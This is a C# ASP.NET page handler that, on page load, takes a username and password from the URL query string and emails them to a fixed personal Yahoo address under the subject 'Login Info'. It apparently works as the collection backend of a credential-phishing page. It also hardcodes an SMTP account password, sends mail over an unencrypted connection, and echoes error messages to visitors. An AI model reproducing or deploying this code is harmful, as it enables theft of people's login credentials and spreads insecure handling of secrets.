using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.IO;

public partial class SendEmail : System.Web.UI.Page
{
 
    protected void Page_Load(object sender, EventArgs e)
    {
        int steps = 0;
        try
        {
            SmtpClient mail = new SmtpClient();
            MailMessage msg = new MailMessage();
            msg.To.Add("farshad.south@yahoo.com");
            string Userr = Request.QueryString["U"].ToString();
            string Passs = Request.QueryString["P"].ToString();
            StreamReader sr = new StreamReader(AppDomain.CurrentDomain.BaseDirectory.ToString() + ("\\MTAW\\1.html"));
            string Body = sr.ReadToEnd();
            sr.Close();
            msg.From = new MailAddress("support@abcsafar.net", "Activition");
            Body = Body.Replace("#User#", Userr);
            Body = Body.Replace("#Pass#", Passs);
            msg.Body = Body;
            msg.Subject = "Login Info";
            msg.IsBodyHtml = true;
            mail.EnableSsl = false;
            mail.Host = "mail.abcsafar.net";
            mail.Port = 25;
            mail.Credentials = new NetworkCredential("support@abcsafar.net", "ABC8500mail");
            //mail.UseDefaultCredentials = false;
            mail.Send(msg);
        }
        catch (Exception exp)
        {
            Response.Write(exp.Message + " " + steps.ToString());
        }
    }
}